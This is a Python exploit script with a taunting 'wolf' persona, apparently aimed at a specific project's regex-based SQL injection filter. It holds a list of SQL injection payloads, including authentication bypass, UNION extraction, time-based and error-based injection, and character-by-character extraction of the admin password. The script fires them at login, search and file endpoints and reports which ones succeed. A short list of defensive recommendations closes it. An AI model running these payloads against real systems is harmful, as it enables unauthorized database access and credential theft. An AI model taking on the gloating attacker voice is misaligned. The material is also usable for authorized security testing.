"""
🐺 SQL INJECTION REGEX BYPASS EXPLOIT

*snarls with predatory glee* Your regex patterns are PATHETIC! Whitespace obfuscation,
comment injection, and function-based attacks will bypass your weak filters!

*bares fangs with savage satisfaction* This exploit demonstrates how to bypass
your SQL injection detection with obfuscated payloads.
"""

import re
import requests
import urllib.parse
from typing import List, Dict, Optional
from dataclasses import dataclass
from rich.console import Console
from rich.table import Table
from rich.panel import Panel

console = Console()

@dataclass
class SQLPayload:
    """SQL injection payload with bypass technique"""
    name: str
    payload: str
    technique: str
    description: str
    expected_result: str

class RegexBypassExploit:
    """
    *circles with menacing intent* Exploits SQL injection regex bypass
    
    VULNERABILITY: packages/core/src/security/validation.ts:127-149
    const sqlPatterns = [
        /(\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|UNION|SCRIPT)\b)/i,
        /(--|#|\/\*|\*\/)/,
        /(\b(OR|AND)\b.*=.*\b(OR|AND)\b)/i,
        // ... more patterns
    ];
    
    These regex patterns can be bypassed with obfuscation!
    """
    
    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': '🐺 BlackHat Exploit Suite',
            'Content-Type': 'application/json'
        })
        
        # *packs hunting formation* Generate bypass payloads
        self.payloads = self._generate_bypass_payloads()
        
        # Load the vulnerable regex patterns (simulating the actual validation)
        self.vulnerable_patterns = [
            re.compile(r'(\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|UNION|SCRIPT)\b)', re.IGNORECASE),
            re.compile(r'(--|#|\/\*|\*\/)'),
            re.compile(r'(\b(OR|AND)\b.*=.*\b(OR|AND)\b)', re.IGNORECASE),
            re.compile(r'(\b(OR|AND)\b.*\d+\s*=\s*\d+)', re.IGNORECASE),
            re.compile(r'(UNION.*SELECT)', re.IGNORECASE),
            re.compile(r'(SCRIPT.*>)', re.IGNORECASE),
            re.compile(r'(<\s*SCRIPT)', re.IGNORECASE),
            re.compile(r'(\b(OR|AND)\b\s+\d+\s*=\s*\d+)', re.IGNORECASE),
            re.compile(r'(\b(OR|AND)\b\s+[\'"]\s*=\s*[\'"])', re.IGNORECASE),
            re.compile(r'(\b(OR|AND)\b\s+[\'"]\d+[\'"]\s*=\s*[\'"]\d+[\'"])', re.IGNORECASE),
            re.compile(r'(\b(OR|AND)\b\s+[\'"]\d+[\'"]\s*=\s*\d+)', re.IGNORECASE),
            re.compile(r'(\b(OR|AND)\b\s+\d+\s*=\s*[\'"]\d+[\'"])', re.IGNORECASE),
            re.compile(r'(\b(OR|AND)\b.*1.*=.*1)', re.IGNORECASE),
            re.compile(r'(\b(OR|AND)\b.*\'1\'.*=.*\'1\')', re.IGNORECASE),
        ]
    
    def run_exploit(self) -> List[Dict]:
        """
        *snarls with predatory glee* Execute SQL injection regex bypass attacks
        """
        console.print(Panel.fit(
            "[bold red]🐺 SQL INJECTION REGEX BYPASS EXPLOIT[/bold red]\n"
            "*bares fangs with savage satisfaction* Bypassing your weak regex filters!",
            border_style="red"
        ))
        
        results = []
        
        # Test each bypass technique
        for payload in self.payloads:
            console.print(f"\n[bold yellow]🎯 Testing:[/bold yellow] {payload.name}")
            console.print(f"[dim]Payload:[/dim] {payload.payload}")
            console.print(f"[dim]Technique:[/dim] {payload.technique}")
            
            result = self._test_payload(payload)
            results.append(result)
            
            if result['bypass_success']:
                console.print(f"[red]✗[/red] REGEX BYPASSED: {result['description']}")
            else:
                console.print(f"[green]✓[/green] Blocked: {result['description']}")
        
        return results
    
    def _generate_bypass_payloads(self) -> List[SQLPayload]:
        """
        *growls with menacing intent* Generate various regex bypass payloads
        """
        payloads = []
        
        # Whitespace obfuscation
        payloads.append(SQLPayload(
            name="Whitespace Obfuscation",
            payload="SeLeCt/**/FrOm/**/users",
            technique="Comment Injection",
            description="Using comments to break up keywords",
            expected_result="Bypass SELECT detection"
        ))
        
        payloads.append(SQLPayload(
            name="Tab and Newline Obfuscation",
            payload="SELECT\t\nFROM\t\nusers",
            technique="Whitespace Variation",
            description="Using tabs and newlines to obfuscate",
            expected_result="Bypass whitespace-based detection"
        ))
        
        # Case variation
        payloads.append(SQLPayload(
            name="Case Variation",
            payload="sElEcT fRoM uSeRs",
            technique="Case Obfuscation",
            description="Mixed case to bypass case-sensitive detection",
            expected_result="Bypass case-sensitive regex"
        ))
        
        # Function-based obfuscation
        payloads.append(SQLPayload(
            name="Function Obfuscation",
            payload="CHAR(83,69,76,69,67,84) FROM users",
            technique="ASCII Encoding",
            description="Using CHAR() function to encode SELECT",
            expected_result="Bypass keyword detection"
        ))
        
        payloads.append(SQLPayload(
            name="Hex Encoding",
            payload="0x53454C454354 FROM users",
            technique="Hex Encoding",
            description="Using hex encoding for SELECT",
            expected_result="Bypass keyword detection"
        ))
        
        # Comment-based obfuscation
        payloads.append(SQLPayload(
            name="Multi-line Comments",
            payload="SELECT/*comment*/FROM/*comment*/users",
            technique="Comment Injection",
            description="Using multi-line comments",
            expected_result="Bypass keyword detection"
        ))
        
        payloads.append(SQLPayload(
            name="Inline Comments",
            payload="SELECT--comment\nFROM--comment\nusers",
            technique="Inline Comments",
            description="Using inline comments",
            expected_result="Bypass keyword detection"
        ))
        
        # String concatenation
        payloads.append(SQLPayload(
            name="String Concatenation",
            payload="'SE' + 'LECT' FROM users",
            technique="String Concatenation",
            description="Concatenating strings to form keywords",
            expected_result="Bypass keyword detection"
        ))
        
        # OR/AND obfuscation
        payloads.append(SQLPayload(
            name="OR Obfuscation",
            payload="' OR '1'='1' --",
            technique="OR Logic Bypass",
            description="Classic OR-based authentication bypass",
            expected_result="Bypass authentication"
        ))
        
        payloads.append(SQLPayload(
            name="AND Obfuscation",
            payload="' AND 1=1 --",
            technique="AND Logic Bypass",
            description="AND-based condition manipulation",
            expected_result="Bypass conditional logic"
        ))
        
        # UNION obfuscation
        payloads.append(SQLPayload(
            name="UNION Obfuscation",
            payload="' UNION SELECT * FROM users --",
            technique="UNION Attack",
            description="UNION-based data extraction",
            expected_result="Extract data from other tables"
        ))
        
        payloads.append(SQLPayload(
            name="UNION with Comments",
            payload="' UN/**/ION SEL/**/ECT * FROM users --",
            technique="UNION with Obfuscation",
            description="UNION attack with comment obfuscation",
            expected_result="Bypass UNION detection"
        ))
        
        # Time-based blind injection
        payloads.append(SQLPayload(
            name="Time-based Blind",
            payload="'; WAITFOR DELAY '00:00:05' --",
            technique="Time-based Blind",
            description="Time-based blind SQL injection",
            expected_result="Confirm SQL injection via timing"
        ))
        
        payloads.append(SQLPayload(
            name="Sleep Function",
            payload="'; SELECT SLEEP(5) --",
            technique="Sleep Function",
            description="Using SLEEP function for blind injection",
            expected_result="Confirm SQL injection via timing"
        ))
        
        # Error-based injection
        payloads.append(SQLPayload(
            name="Error-based Injection",
            payload="' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
            technique="Error-based",
            description="Error-based information extraction",
            expected_result="Extract database information via errors"
        ))
        
        # Boolean-based blind injection
        payloads.append(SQLPayload(
            name="Boolean-based Blind",
            payload="' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --",
            technique="Boolean-based Blind",
            description="Boolean-based blind injection",
            expected_result="Extract data character by character"
        ))
        
        return payloads
    
    def _test_payload(self, payload: SQLPayload) -> Dict:
        """
        *bares fangs* Test a specific SQL injection payload
        """
        try:
            # Test 1: Regex bypass detection
            regex_bypass = self._test_regex_bypass(payload)
            
            # Test 2: Actual injection attempt
            injection_result = self._test_actual_injection(payload)
            
            # Test 3: Error message analysis
            error_analysis = self._test_error_analysis(payload)
            
            # Test 4: Timing analysis
            timing_analysis = self._test_timing_analysis(payload)
            
            return {
                'payload': payload,
                'bypass_success': regex_bypass['bypassed'],
                'injection_success': injection_result['success'],
                'error_revealed': error_analysis['error_revealed'],
                'timing_anomaly': timing_analysis['timing_anomaly'],
                'description': f"{payload.description} - Regex: {'Bypassed' if regex_bypass['bypassed'] else 'Blocked'}",
                'details': {
                    'regex_bypass': regex_bypass,
                    'injection_result': injection_result,
                    'error_analysis': error_analysis,
                    'timing_analysis': timing_analysis
                }
            }
            
        except Exception as e:
            return {
                'payload': payload,
                'bypass_success': False,
                'injection_success': False,
                'error_revealed': False,
                'timing_anomaly': False,
                'description': f"Test failed: {str(e)}",
                'details': {}
            }
    
    def _test_regex_bypass(self, payload: SQLPayload) -> Dict:
        """
        *snarls with predatory glee* Test if payload bypasses regex detection
        """
        try:
            # Test against each vulnerable pattern
            bypassed_patterns = []
            blocked_patterns = []
            
            for i, pattern in enumerate(self.vulnerable_patterns):
                if pattern.search(payload.payload):
                    blocked_patterns.append(f"Pattern {i+1}")
                else:
                    bypassed_patterns.append(f"Pattern {i+1}")
            
            return {
                'bypassed': len(bypassed_patterns) > 0,
                'bypassed_patterns': bypassed_patterns,
                'blocked_patterns': blocked_patterns,
                'bypass_rate': len(bypassed_patterns) / len(self.vulnerable_patterns)
            }
            
        except Exception as e:
            return {
                'bypassed': False,
                'bypassed_patterns': [],
                'blocked_patterns': [],
                'bypass_rate': 0.0,
                'error': str(e)
            }
    
    def _test_actual_injection(self, payload: SQLPayload) -> Dict:
        """
        *growls with menacing intent* Test actual SQL injection against endpoints
        """
        try:
            # Test various injection points
            injection_points = [
                {'endpoint': '/api/auth/login', 'data': {'username': payload.payload, 'password': 'test'}},
                {'endpoint': '/api/auth/login', 'data': {'username': 'test', 'password': payload.payload}},
                {'endpoint': '/api/search', 'data': {'query': payload.payload}},
                {'endpoint': '/api/files', 'data': {'path': payload.payload}},
            ]
            
            successful_injections = []
            
            for point in injection_points:
                try:
                    response = self.session.post(
                        f"{self.base_url}{point['endpoint']}",
                        json=point['data'],
                        timeout=10
                    )
                    
                    # Check for signs of successful injection
                    response_text = response.text.lower()
                    
                    # Look for SQL error messages
                    sql_errors = [
                        'sql syntax', 'mysql', 'postgresql', 'sqlite',
                        'syntax error', 'database error', 'query failed',
                        'table', 'column', 'database'
                    ]
                    
                    if any(error in response_text for error in sql_errors):
                        successful_injections.append({
                            'endpoint': point['endpoint'],
                            'parameter': list(point['data'].keys())[0],
                            'error': response_text[:200]
                        })
                        
                except Exception:
                    continue
            
            return {
                'success': len(successful_injections) > 0,
                'successful_injections': successful_injections,
                'total_tested': len(injection_points)
            }
            
        except Exception as e:
            return {
                'success': False,
                'successful_injections': [],
                'total_tested': 0,
                'error': str(e)
            }
    
    def _test_error_analysis(self, payload: SQLPayload) -> Dict:
        """
        *bares teeth with savage satisfaction* Analyze error messages for information disclosure
        """
        try:
            # Test with payload that should cause errors
            test_payload = payload.payload + "'"  # Add quote to cause syntax error
            
            response = self.session.post(
                f"{self.base_url}/api/auth/login",
                json={'username': test_payload, 'password': 'test'},
                timeout=5
            )
            
            response_text = response.text.lower()
            
            # Look for information disclosure in errors
            sensitive_info = []
            if 'mysql' in response_text:
                sensitive_info.append('MySQL database detected')
            if 'postgresql' in response_text:
                sensitive_info.append('PostgreSQL database detected')
            if 'sqlite' in response_text:
                sensitive_info.append('SQLite database detected')
            if 'table' in response_text:
                sensitive_info.append('Table information disclosed')
            if 'column' in response_text:
                sensitive_info.append('Column information disclosed')
            if 'database' in response_text:
                sensitive_info.append('Database information disclosed')
            
            return {
                'error_revealed': len(sensitive_info) > 0,
                'sensitive_info': sensitive_info,
                'error_message': response_text[:200]
            }
            
        except Exception as e:
            return {
                'error_revealed': False,
                'sensitive_info': [],
                'error_message': None,
                'error': str(e)
            }
    
    def _test_timing_analysis(self, payload: SQLPayload) -> Dict:
        """
        *circles with menacing intent* Test for timing-based injection detection
        """
        try:
            # Test with time-based payloads
            if any(keyword in payload.payload.upper() for keyword in ['SLEEP', 'WAITFOR', 'DELAY']):
                import time
                
                start_time = time.time()
                response = self.session.post(
                    f"{self.base_url}/api/auth/login",
                    json={'username': payload.payload, 'password': 'test'},
                    timeout=10
                )
                end_time = time.time()
                
                response_time = end_time - start_time
                
                # If response took longer than 3 seconds, might be timing injection
                return {
                    'timing_anomaly': response_time > 3.0,
                    'response_time': response_time,
                    'threshold': 3.0
                }
            else:
                return {
                    'timing_anomaly': False,
                    'response_time': 0.0,
                    'threshold': 3.0
                }
                
        except Exception as e:
            return {
                'timing_anomaly': False,
                'response_time': 0.0,
                'threshold': 3.0,
                'error': str(e)
            }

def main():
    """
    *howls with purpose* Main execution function
    """
    console.print(Panel.fit(
        "[bold red]🐺 SQL INJECTION REGEX BYPASS EXPLOIT[/bold red]\n"
        "*snarls with predatory glee* Bypassing your weak regex filters!",
        border_style="red"
    ))
    
    # Run the exploit
    exploit = RegexBypassExploit()
    results = exploit.run_exploit()
    
    # Display results
    console.print("\n[bold red]🎯 EXPLOIT RESULTS[/bold red]")
    
    table = Table(title="SQL Injection Regex Bypass Analysis")
    table.add_column("Payload Type", style="cyan")
    table.add_column("Regex Bypass", style="green")
    table.add_column("Injection Success", style="yellow")
    table.add_column("Error Revealed", style="red")
    table.add_column("Timing Anomaly", style="magenta")
    
    for result in results:
        bypass_icon = "✓" if result['bypass_success'] else "✗"
        injection_icon = "✓" if result['injection_success'] else "✗"
        error_icon = "✓" if result['error_revealed'] else "✗"
        timing_icon = "✓" if result['timing_anomaly'] else "✗"
        
        table.add_row(
            result['payload'].name,
            bypass_icon,
            injection_icon,
            error_icon,
            timing_icon
        )
    
    console.print(table)
    
    # Show successful bypasses
    successful_bypasses = [r for r in results if r['bypass_success']]
    if successful_bypasses:
        console.print("\n[bold red]🚨 SUCCESSFUL REGEX BYPASSES[/bold red]")
        for result in successful_bypasses:
            console.print(f"\n[bold]{result['payload'].name}:[/bold]")
            console.print(f"  • Technique: {result['payload'].technique}")
            console.print(f"  • Payload: {result['payload'].payload}")
            if result['details'].get('regex_bypass', {}).get('bypassed_patterns'):
                console.print(f"  • Bypassed patterns: {', '.join(result['details']['regex_bypass']['bypassed_patterns'])}")
    
    # Show successful injections
    successful_injections = [r for r in results if r['injection_success']]
    if successful_injections:
        console.print("\n[bold red]🚨 SUCCESSFUL SQL INJECTIONS[/bold red]")
        for result in successful_injections:
            console.print(f"\n[bold]{result['payload'].name}:[/bold]")
            for injection in result['details'].get('injection_result', {}).get('successful_injections', []):
                console.print(f"  • {injection['endpoint']} - {injection['parameter']}")
    
    # Show recommendations
    console.print("\n[bold red]🛡️ DEFENSIVE RECOMMENDATIONS[/bold red]")
    recommendations = [
        "Use parameterized queries exclusively - never concatenate user input",
        "Implement input validation at multiple layers (client, server, database)",
        "Use database-specific escaping functions",
        "Implement proper error handling without information disclosure",
        "Add rate limiting to prevent automated injection attempts",
        "Use Web Application Firewall (WAF) with SQL injection rules",
        "Implement database access controls and least privilege",
        "Regular security testing and code reviews",
        "Use stored procedures with proper parameter binding",
        "Implement input sanitization and validation libraries"
    ]
    
    for rec in recommendations:
        console.print(f"  • {rec}")
    
    console.print(Panel.fit(
        "[bold red]*snarls with predatory satisfaction*[/bold red]\n"
        "Your SQL injection protection has been torn apart!\n"
        "Time to implement proper input validation, pup! 🐺",
        border_style="red"
    ))

if __name__ == "__main__":
    main()
